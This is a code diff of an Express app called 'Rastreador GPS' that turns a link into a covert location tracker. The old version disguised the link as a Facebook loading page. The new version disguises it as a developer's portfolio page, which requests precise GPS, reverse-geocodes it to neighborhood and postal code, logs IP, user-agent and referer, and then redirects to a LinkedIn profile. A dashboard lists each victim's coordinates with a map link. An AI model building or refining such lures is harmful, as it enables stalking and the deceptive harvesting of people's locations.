@@ -146,26 +146,13 @@ app.get('/', (req, res) => {
         }
         .badge-success { background: #28a745; color: white; }
         .badge-warning { background: #ffc107; color: #333; }
-        .warning-box {
-          background: #fff3cd;
-          border: 2px solid #ffc107;
-          padding: 15px;
-          border-radius: 8px;
-          margin-top: 15px;
-        }
-        .warning-box strong { color: #856404; }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="header">
-          <h1>📍 Rastreador GPS</h1>
-          <p>Captura localização via GPS</p>
-          
-          <div class="warning-box">
-            <strong>⚠️ ATENÇÃO:</strong> GPS não funciona no Instagram/Facebook App!<br>
-            <small>Para melhor resultado, envie por SMS ou WhatsApp</small>
-          </div>
+          <h1>📍 Rastreador GPS - Portfólio André</h1>
+          <p>Link para o portfólio do André (Desenvolvedor Mobile)</p>
           
           <div class="link-box">
             <strong>🔗 Link de Rastreamento:</strong>
@@ -212,10 +199,10 @@ app.get('/', (req, res) => {
             
             document.getElementById('totalClicks').textContent = data.total;
             
-            const gpsClicks = data.clicks.filter(c => c.location && c.location.cidade && c.location.cidade !== 'Processando...');
+            const gpsClicks = data.clicks.filter(c => c.gpsLocation && c.gpsLocation.city !== 'Desconhecida');
             document.getElementById('gpsClicks').textContent = gpsClicks.length;
             
-            const noGpsClicks = data.clicks.filter(c => !c.location || !c.location.cidade || c.location.cidade === 'Processando...');
+            const noGpsClicks = data.clicks.filter(c => !c.gpsLocation || c.gpsLocation.city === 'Desconhecida');
             document.getElementById('noGpsClicks').textContent = noGpsClicks.length;
             
             const container = document.getElementById('clicksList');
@@ -235,10 +222,9 @@ app.get('/', (req, res) => {
                 second: '2-digit'
               });
               
-              const hasGPS = c.location && c.location.cidade && c.location.cidade !== 'Processando...';
+              const hasGPS = c.gpsLocation && c.gpsLocation.city !== 'Desconhecida';
               const itemClass = hasGPS ? 'click-item' : 'click-item no-gps';
               
-              // Detecta origem
               let origem = '';
               if (c.userAgent.includes('Instagram')) origem = '📸 Instagram';
               else if (c.userAgent.includes('FBAN') || c.userAgent.includes('FBAV')) origem = '📘 Facebook App';
@@ -249,299 +235,451 @@ app.get('/', (req, res) => {
               
               let content = '';
               if (hasGPS) {
-                const loc = c.location;
+                const loc = c.gpsLocation;
                 content = \`
                   <div class="badge badge-success">✅ GPS ATIVADO</div>
-                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade}</div>
-                  <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado}</div>
-                  \${loc.bairro && loc.bairro !== 'N/A' && loc.bairro !== 'undefined' ? \`
-                    <div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>
-                  \` : ''}
-                  <div class="click-info"><strong>Origem:</strong> \${origem}</div>
-                \`;
-              } else if (c.location && c.location.cidade === 'Processando...') {
-                content = \`
-                  <div class="badge badge-warning">⏳ PROCESSANDO</div>
-                  <div class="click-info">Aguardando resposta da API...</div>
-                  <div class="click-info"><strong>Origem:</strong> \${origem}</div>
+                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.city}, \${loc.state}, \${loc.country}</div>
+                  \${loc.neighborhood ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.neighborhood}</div>\` : ''}
+                  \${loc.postalCode ? \`<div class="click-info">📮 <strong>CEP:</strong> \${loc.postalCode}</div>\` : ''}
+                  <div class="click-info">🗺️ <strong>Coordenadas:</strong> \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</div>
+                  <div class="click-info">📍 <a href="https://www.google.com/maps?q=\${loc.latitude},\${loc.longitude}" target="_blank" style="color:#667eea;">Ver no Google Maps</a></div>
                 \`;
               } else {
                 content = \`
-                  <div class="badge badge-warning">⚠️ GPS NEGADO/BLOQUEADO</div>
-                  <div class="click-info"><strong>Origem:</strong> \${origem}</div>
-                  \${c.userAgent.includes('Instagram') || c.userAgent.includes('FBAN') ? 
-                    '<div class="click-info" style="color:#856404;">⚠️ Instagram/Facebook bloqueia GPS automaticamente</div>' : 
-                    '<div class="click-info">Usuário negou permissão de localização</div>'}
+                  <div class="badge badge-warning">⚠️ GPS NÃO AUTORIZADO</div>
+                  <div class="click-info">Usuário negou permissão de localização ou GPS não disponível</div>
                 \`;
               }
               
-              return \`
-                <div class="\${itemClass}">
-                  <div class="click-time">⏰ \${date}</div>
-                  \${content}
-                </div>
-              \`;
+              return \`<div class="\${itemClass}">
+                <div class="click-time">⏰ \${date}</div>
+                <div class="click-info">🌐 <strong>IP:</strong> \${c.ip}</div>
+                \${content}
+                <div class="click-info">📱 <strong>Origem:</strong> \${origem}</div>
+                <div class="click-info">🔗 <strong>Referer:</strong> \${c.referer || 'Direto'}</div>
+              </div>\`;
             }).join('');
           } catch (error) {
-            console.error('Erro:', error);
+            console.error('Erro ao carregar dados:', error);
           }
         }
         
         loadData();
-        setInterval(loadData, 3000);
+        setInterval(loadData, 10000);
       </script>
     </body>
     </html>
   `);
 });
 
-// Página de rastreamento - DETECTA INSTAGRAM
-app.get('/track', async (req, res) => {
+// Rota /track - Página do portfólio do André
+app.get('/track', (req, res) => {
   const ip = getIP(req);
-  const userAgent = req.headers['user-agent'] || 'Desconhecido';
+  const userAgent = req.headers['user-agent'] || '';
+  const referer = req.headers['referer'] || req.headers['referrer'] || 'Direto';
   
+  // Registrar o clique inicial (sem GPS ainda)
   const clickData = {
     id: Date.now(),
-    timestamp: new Date().toISOString(),
     ip: ip,
     userAgent: userAgent,
-    location: null
+    referer: referer,
+    timestamp: new Date().toISOString(),
+    gpsLocation: null
   };
   
   clicks.push(clickData);
   
   console.log('');
-  console.log('🎯 NOVO CLIQUE');
-  console.log('Hora:', new Date().toLocaleString('pt-BR'));
-  console.log('User-Agent:', userAgent.substring(0, 50) + '...');
+  console.log('🔔 NOVO CLIQUE');
+  console.log('  IP:', ip);
+  console.log('  User-Agent:', userAgent.substring(0, 80));
+  console.log('  Referer:', referer);
   
-  // Detecta se é Instagram/Facebook
-  const isInstagram = userAgent.includes('Instagram');
-  const isFacebook = userAgent.includes('FBAN') || userAgent.includes('FBAV');
-  const isInApp = isInstagram || isFacebook;
-  
-  if (isInApp) {
-    console.log('⚠️  Origem: Instagram/Facebook App (GPS bloqueado)');
-  }
-  
+  // Servir a página do portfólio do André
   res.send(`
     <!DOCTYPE html>
     <html lang="pt-BR">
     <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Carregando...</title>
-      <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-          margin: 0;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          min-height: 100vh;
-          background: #1877f2;
-          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        }
-        .container {
-          text-align: center;
-          color: white;
-          padding: 20px;
-          max-width: 350px;
-        }
-        .logo {
-          font-size: 80px;
-          font-weight: bold;
-          margin-bottom: 20px;
-        }
-        h2 {
-          font-size: 20px;
-          font-weight: 400;
-          margin-bottom: 15px;
-        }
-        .message {
-          font-size: 14px;
-          opacity: 0.9;
-          margin-bottom: 30px;
-        }
-        .loader {
-          border: 4px solid rgba(255,255,255,0.3);
-          border-top: 4px solid white;
-          border-radius: 50%;
-          width: 40px;
-          height: 40px;
-          animation: spin 0.8s linear infinite;
-          margin: 20px auto;
-        }
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-        .warning {
-          background: rgba(255,255,255,0.2);
-          padding: 15px;
-          border-radius: 10px;
-          margin-top: 20px;
-          font-size: 13px;
-          line-height: 1.6;
-        }
-        .open-browser-btn {
-          background: white;
-          color: #1877f2;
-          border: none;
-          padding: 12px 30px;
-          border-radius: 25px;
-          font-weight: bold;
-          font-size: 14px;
-          margin-top: 15px;
-          cursor: pointer;
-        }
-      </style>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Portfólio - André</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                background: #0a0a0a;
+                color: #fff;
+                min-height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+                position: relative;
+                overflow: hidden;
+            }
+            
+            .grid-background {
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-image: 
+                    linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+                background-size: 50px 50px;
+                animation: gridMove 20s linear infinite;
+                pointer-events: none;
+            }
+            
+            @keyframes gridMove {
+                0% { transform: translate(0, 0); }
+                100% { transform: translate(50px, 50px); }
+            }
+            
+            .gradient-orb {
+                position: absolute;
+                width: 500px;
+                height: 500px;
+                background: radial-gradient(circle, rgba(99, 102, 241, 0.15), transparent 70%);
+                border-radius: 50%;
+                filter: blur(60px);
+                animation: float 8s ease-in-out infinite;
+                pointer-events: none;
+            }
+            
+            .gradient-orb:nth-child(2) {
+                top: 20%;
+                right: 10%;
+                background: radial-gradient(circle, rgba(139, 92, 246, 0.15), transparent 70%);
+                animation-delay: -4s;
+            }
+            
+            @keyframes float {
+                0%, 100% { transform: translate(0, 0); }
+                50% { transform: translate(30px, -30px); }
+            }
+            
+            .container {
+                position: relative;
+                z-index: 1;
+                max-width: 550px;
+                width: 100%;
+                background: rgba(20, 20, 20, 0.8);
+                backdrop-filter: blur(20px);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                border-radius: 24px;
+                padding: 50px 40px;
+                text-align: center;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+                animation: slideUp 0.6s ease;
+            }
+            
+            @keyframes slideUp {
+                from {
+                    opacity: 0;
+                    transform: translateY(30px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+            
+            .avatar {
+                width: 100px;
+                height: 100px;
+                background: linear-gradient(135deg, #6366f1, #8b5cf6);
+                border-radius: 50%;
+                margin: 0 auto 25px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 48px;
+                font-weight: bold;
+                border: 3px solid rgba(255, 255, 255, 0.1);
+                box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
+            }
+            
+            h1 {
+                font-size: 36px;
+                font-weight: 700;
+                margin-bottom: 10px;
+                background: linear-gradient(135deg, #fff, #a0a0a0);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+                background-clip: text;
+            }
+            
+            .subtitle {
+                color: #888;
+                font-size: 18px;
+                margin-bottom: 30px;
+                font-weight: 400;
+            }
+            
+            .description {
+                color: #b0b0b0;
+                font-size: 16px;
+                line-height: 1.6;
+                margin-bottom: 35px;
+            }
+            
+            .btn {
+                background: linear-gradient(135deg, #6366f1, #8b5cf6);
+                color: white;
+                border: none;
+                padding: 16px 50px;
+                border-radius: 12px;
+                font-size: 17px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
+                position: relative;
+                overflow: hidden;
+                width: 100%;
+            }
+            
+            .btn::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: -100%;
+                width: 100%;
+                height: 100%;
+                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+                transition: left 0.5s;
+            }
+            
+            .btn:hover::before {
+                left: 100%;
+            }
+            
+            .btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 12px 30px rgba(99, 102, 241, 0.5);
+            }
+            
+            .btn:active {
+                transform: translateY(0);
+            }
+            
+            .timer {
+                margin-top: 25px;
+                color: #666;
+                font-size: 14px;
+            }
+            
+            .timer-number {
+                color: #6366f1;
+                font-weight: bold;
+                font-size: 18px;
+            }
+            
+            .loading {
+                display: none;
+                margin-top: 20px;
+            }
+            
+            .loading.active {
+                display: block;
+            }
+            
+            .spinner {
+                border: 3px solid rgba(99, 102, 241, 0.2);
+                border-top: 3px solid #6366f1;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto 10px;
+            }
+            
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        </style>
     </head>
     <body>
-      <div class="container">
-        <div class="logo">f</div>
-        ${isInApp ? `
-          <h2>⚠️ Detectado Instagram/Facebook</h2>
-          <div class="warning">
-            Para acessar o conteúdo, você precisa abrir no navegador.<br><br>
-            Toque nos <strong>3 pontos (...)</strong> e selecione <strong>"Abrir no navegador"</strong>
-          </div>
-          <div class="loader"></div>
-          <div class="message">Redirecionando automaticamente em 5 segundos...</div>
-        ` : `
-          <h2 id="status">Carregando...</h2>
-          <div class="message" id="message">Aguarde um momento</div>
-          <div class="loader"></div>
-        `}
-      </div>
-      
-      <script>
-        const clickId = ${clickData.id};
-        const isInApp = ${isInApp};
-        let redirected = false;
+        <div class="grid-background"></div>
+        <div class="gradient-orb"></div>
+        <div class="gradient-orb"></div>
         
-        function redirect() {
-          if (!redirected) {
-            redirected = true;
-            window.location.href = 'https://www.facebook.com/';
-          }
-        }
-        
-        // Se for Instagram/Facebook, redireciona direto (GPS não vai funcionar mesmo)
-        if (isInApp) {
-          setTimeout(redirect, 5000);
-        } else {
-          // Navegador normal - tenta GPS
-          if (!navigator.geolocation) {
-            setTimeout(redirect, 1000);
-          } else {
-            const timeout = setTimeout(() => {
-              if (!redirected) redirect();
-            }, 10000);
+        <div class="container">
+            <div class="avatar">A</div>
             
-            navigator.geolocation.getCurrentPosition(
-              async (position) => {
-                clearTimeout(timeout);
-                
+            <h1>André</h1>
+            <div class="subtitle">Desenvolvedor Mobile</div>
+            
+            <div class="description">
+                Desenvolvendo aplicativos mobile inovadores para iOS e Android. Transformando ideias em experiências digitais de alta performance.
+            </div>
+            
+            <button class="btn" id="continueBtn">
+                Ver Portfólio Completo
+            </button>
+            
+            <div class="timer">
+                Carregando em <span class="timer-number" id="countdown">5</span>s
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="color: #888; font-size: 14px;">Preparando...</p>
+            </div>
+        </div>
+
+        <script>
+            const REDIRECT_URL = 'https://www.linkedin.com/in/andre-oliveira-dos-santos-70067a237';
+            const clickId = ${clickData.id};
+            
+            let seconds = 5;
+            let trackingSent = false;
+            const countdownElement = document.getElementById('countdown');
+            const continueBtn = document.getElementById('continueBtn');
+            const loadingElement = document.getElementById('loading');
+
+            async function reverseGeocode(lat, lon) {
                 try {
-                  await fetch('/api/save-gps', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                      clickId: clickId,
-                      lat: position.coords.latitude,
-                      lng: position.coords.longitude
-                    })
-                  });
+                    const response = await fetch(
+                        \`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}&accept-language=pt-BR\`
+                    );
+                    const data = await response.json();
+                    
+                    return {
+                        latitude: lat,
+                        longitude: lon,
+                        city: data.address?.city || data.address?.town || data.address?.village || 'Desconhecida',
+                        state: data.address?.state || 'Desconhecido',
+                        country: data.address?.country || 'Desconhecido',
+                        neighborhood: data.address?.neighbourhood || data.address?.suburb || '',
+                        postalCode: data.address?.postcode || '',
+                        fullAddress: data.display_name || ''
+                    };
                 } catch (error) {
-                  console.error('Erro:', error);
+                    return {
+                        latitude: lat,
+                        longitude: lon,
+                        city: 'Erro ao obter',
+                        state: '',
+                        country: '',
+                        error: error.message
+                    };
                 }
+            }
+
+            async function trackAndRedirect() {
+                if (trackingSent) return;
+                trackingSent = true;
+
+                loadingElement.classList.add('active');
+                continueBtn.disabled = true;
+                continueBtn.style.opacity = '0.6';
+
+                if ("geolocation" in navigator) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 0
+                            });
+                        });
+
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const location = await reverseGeocode(lat, lon);
+
+                        await fetch('/save-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                clickId: clickId,
+                                gpsLocation: location,
+                                locationPermission: 'granted'
+                            })
+                        });
+                    } catch (error) {
+                        await fetch('/save-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                clickId: clickId,
+                                gpsLocation: null,
+                                locationPermission: 'denied',
+                                error: error.message
+                            })
+                        });
+                    }
+                } else {
+                    await fetch('/save-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            clickId: clickId,
+                            gpsLocation: null,
+                            locationPermission: 'not_supported'
+                        })
+                    });
+                }
+
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 500);
+            }
+
+            const interval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
                 
-                redirect();
-              },
-              (error) => {
-                clearTimeout(timeout);
-                redirect();
-              },
-              {
-                enableHighAccuracy: true,
-                timeout: 8000,
-                maximumAge: 0
-              }
-            );
-          }
-        }
-      </script>
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    trackAndRedirect();
+                }
+            }, 1000);
+
+            continueBtn.addEventListener('click', () => {
+                clearInterval(interval);
+                trackAndRedirect();
+            });
+        </script>
     </body>
     </html>
   `);
 });
 
-// Salvar GPS
-app.post('/api/save-gps', async (req, res) => {
+// Salvar localização GPS
+app.post('/save-location', async (req, res) => {
   try {
-    const { clickId, lat, lng } = req.body;
+    const { clickId, gpsLocation, locationPermission, error } = req.body;
     
     const click = clicks.find(c => c.id === clickId);
     if (!click) {
-      return res.json({ success: false });
+      return res.json({ success: false, message: 'Click not found' });
     }
     
-    if (!lat || !lng) {
-      return res.json({ success: false });
-    }
+    click.gpsLocation = gpsLocation;
+    click.locationPermission = locationPermission;
     
-    console.log('  📍 GPS:', lat, lng);
-    
-    click.location = {
-      cidade: 'Processando...',
-      estado: 'Processando...',
-      bairro: 'N/A'
-    };
-    
-    try {
-      const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=pt`;
-      const data = await fetchJSON(url);
-      
-      if (data) {
-        click.location = {
-          cidade: data.city || data.locality || data.localityInfo?.administrative?.[3]?.name || 'Não identificada',
-          estado: data.principalSubdivision || 'Não identificado',
-          bairro: data.localityInfo?.administrative?.[0]?.name || 'N/A'
-        };
-        
-        console.log('  ✅ Localização:', click.location.cidade, '-', click.location.estado);
-      }
-    } catch (error) {
-      console.error('  ❌ Erro API:', error.message);
-      
-      try {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        const url2 = `https://geocode.xyz/${lat},${lng}?json=1`;
-        const data2 = await fetchJSON(url2);
-        
-        if (data2 && data2.city) {
-          click.location = {
-            cidade: data2.city || 'Não identificada',
-            estado: data2.state || data2.region || 'Não identificado',
-            bairro: 'N/A'
-          };
-          console.log('  ✅ Localização (API 2):', click.location.cidade, '-', click.location.estado);
-        }
-      } catch (error2) {
-        console.error('  ❌ Erro API 2:', error2.message);
-        click.location = {
-          cidade: 'Erro ao buscar',
-          estado: 'Erro',
-          bairro: 'N/A'
-        };
-      }
+    if (gpsLocation && gpsLocation.city !== 'Desconhecida') {
+      console.log('  ✅ GPS CAPTURADO:', gpsLocation.city, '-', gpsLocation.state);
+      console.log('  📍 Coordenadas:', gpsLocation.latitude, gpsLocation.longitude);
+    } else {
+      console.log('  ⚠️ GPS não autorizado ou erro:', locationPermission);
     }
     
     res.json({ success: true });
   } catch (error) {
-    console.error('Erro geral:', error);
-    res.json({ success: false });
+    console.error('Erro ao salvar localização:', error);
+    res.json({ success: false, message: error.message });
   }
 });
 
@@ -565,11 +703,11 @@ app.get('/health', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log('');
   console.log('========================================');
-  console.log('✅ RASTREADOR GPS ONLINE');
+  console.log('✅ RASTREADOR GPS - PORTFÓLIO ANDRÉ');
   console.log('========================================');
   console.log('🌐 Porta:', PORT);
-  console.log('📍 Detecta Instagram/Facebook');
-  console.log('🔗 Redirect: Facebook');
+  console.log('📱 Desenvolvedor Mobile');
+  console.log('🔗 Redirect: LinkedIn do André');
   console.log('========================================');
   console.log('');
 });
